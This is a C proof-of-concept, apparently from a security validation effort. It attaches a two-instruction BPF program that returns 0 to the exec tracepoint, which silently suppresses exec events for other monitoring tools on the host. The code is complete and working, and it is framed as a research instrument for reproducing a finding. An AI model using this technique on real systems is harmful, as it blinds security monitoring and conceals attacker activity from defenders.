/*
 * tracepoint_interferer.c — the finding, reduced to its minimal cause.
 *
 * The AIRI validation run observed that A3S Observer, running alongside
 * Sniffer Dog 2.0, silently drove Sniffer Dog's exec observations to zero
 * while Sniffer Dog reported no loss. This program reproduces that effect
 * with the smallest possible thing that can cause it, so the reproduction
 * proves the *mechanism* rather than merely re-observing A3S:
 *
 *   a BPF program that does nothing but return 0, attached to the
 *   sched:sched_process_exec tracepoint's perf event.
 *
 * The kernel runs any BPF program attached to a tracepoint's perf event in
 * perf_trace_run_bpf_submit(), and submits the sample to perf consumers only
 * if that program returns non-zero. The gate is keyed on the tracepoint
 * (trace_event_call), so a program returning 0 suppresses the sample for
 * EVERY perf_event_open consumer of that tracepoint, host-wide — including
 * Sniffer Dog, which is a separate process that attached its own perf event
 * to the same tracepoint.
 *
 * This program is two BPF instructions. It carries no A3S code, reads no
 * events, and has no purpose but to hold the gate shut. If Sniffer Dog goes
 * blind while THIS is attached, the cause is the return-value gate and
 * nothing else.
 *
 * It is an INTERFERENCE INSTRUMENT for a controlled experiment. It is not
 * part of Vanian, it observes nothing, and it enforces nothing. It attaches,
 * prints one line so the harness knows it is live, waits for a signal, and
 * detaches on exit by closing its fds.
 *
 * Build:  gcc -O2 -o tracepoint_interferer tracepoint_interferer.c
 * Run:    ./tracepoint_interferer <tracepoint_id>   (SIGTERM/SIGINT to stop)
 *
 * Requires CAP_BPF (or root) — the whole point of the finding is that this
 * capability is all an adversary needs to blind the observer.
 */

#include <errno.h>
#include <linux/bpf.h>
#include <linux/perf_event.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef __NR_bpf
#define __NR_bpf 321
#endif

static volatile sig_atomic_t stop = 0;
static void on_signal(int sig) { (void)sig; stop = 1; }

/* One eBPF instruction is 8 bytes: op(1) regs(1) off(2) imm(4). */
struct bpf_insn_raw {
    uint8_t code;
    uint8_t regs; /* dst_reg : src_reg, 4 bits each */
    int16_t off;
    int32_t imm;
};

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "usage: %s <tracepoint_id>\n", argv[0]);
        return 2;
    }
    uint64_t tp_id = strtoull(argv[1], NULL, 10);

    /*
     * The program:  r0 = 0 ; exit
     * BPF_MOV64_IMM(BPF_REG_0, 0):  code = BPF_ALU64|BPF_MOV|BPF_K = 0xb7
     * BPF_EXIT_INSN():              code = BPF_JMP|BPF_EXIT       = 0x95
     * Returning 0 is what holds the perf-submission gate shut.
     */
    struct bpf_insn_raw insns[] = {
        {0xb7, 0x00, 0, 0}, /* r0 = 0 */
        {0x95, 0x00, 0, 0}, /* exit   */
    };

    char log[4096];
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.prog_type = BPF_PROG_TYPE_TRACEPOINT;
    attr.insn_cnt = 2;
    attr.insns = (uint64_t)(unsigned long)insns;
    attr.license = (uint64_t)(unsigned long)"GPL";
    attr.log_level = 1;
    attr.log_size = sizeof(log);
    attr.log_buf = (uint64_t)(unsigned long)log;

    int prog_fd = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    if (prog_fd < 0) {
        fprintf(stderr, "BPF_PROG_LOAD failed: %s\nverifier log:\n%s\n",
                strerror(errno), log);
        return 1;
    }

    struct perf_event_attr pea;
    memset(&pea, 0, sizeof(pea));
    pea.type = PERF_TYPE_TRACEPOINT;
    pea.size = sizeof(pea);
    pea.config = tp_id;
    pea.sample_period = 1;
    pea.sample_type = PERF_SAMPLE_RAW;
    pea.disabled = 1;

    /* Attach to the tracepoint on CPU 0; the gate is per-tracepoint, so one
     * CPU is enough to demonstrate host-wide suppression, but we open all
     * online CPUs to make the effect total and unambiguous. */
    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu < 1) ncpu = 1;
    int attached = 0;
    for (long cpu = 0; cpu < ncpu; cpu++) {
        int pfd = syscall(__NR_perf_event_open, &pea, -1, (int)cpu, -1, 0);
        if (pfd < 0) {
            fprintf(stderr, "perf_event_open cpu %ld failed: %s\n", cpu,
                    strerror(errno));
            continue;
        }
        if (ioctl(pfd, PERF_EVENT_IOC_SET_BPF, prog_fd) < 0) {
            fprintf(stderr, "PERF_EVENT_IOC_SET_BPF cpu %ld failed: %s\n", cpu,
                    strerror(errno));
            close(pfd);
            continue;
        }
        if (ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0) < 0) {
            fprintf(stderr, "PERF_EVENT_IOC_ENABLE cpu %ld failed: %s\n", cpu,
                    strerror(errno));
            close(pfd);
            continue;
        }
        attached++;
        /* Deliberately leak pfd for process lifetime: closing it detaches. */
    }

    if (attached == 0) {
        fprintf(stderr, "no perf events attached; interference not established\n");
        return 1;
    }

    /* The harness waits for this exact line before starting the subject. */
    printf("INTERFERER_ATTACHED tracepoint_id=%lu cpus=%d\n",
           (unsigned long)tp_id, attached);
    fflush(stdout);

    signal(SIGTERM, on_signal);
    signal(SIGINT, on_signal);
    while (!stop) pause();

    /* Exit closes every fd, which detaches the program and reopens the gate. */
    printf("INTERFERER_DETACHING\n");
    fflush(stdout);
    return 0;
}
